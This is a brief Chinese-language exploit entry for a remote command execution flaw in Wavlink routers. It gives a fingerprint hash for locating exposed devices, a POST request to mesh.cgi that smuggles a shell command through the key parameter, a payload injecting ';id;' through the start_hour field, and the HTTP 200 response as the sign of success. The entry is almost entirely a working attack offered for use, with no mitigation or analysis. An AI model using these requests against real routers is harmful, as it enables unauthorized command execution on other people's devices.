# Wavlink路由器远程命令执行漏洞

Wavlink ｜ 命令执行 ｜ —
- **指纹**：`icon_hash="-1350437236"`
- **请求**：`POST /cgi-bin/mesh.cgi?page=upgrade&key=%27;id%3E%3Edudesite.txt' HTTP/1.1`

**Payload**
```
page=night_led&start_hour=;id;
```
- **响应特征**：200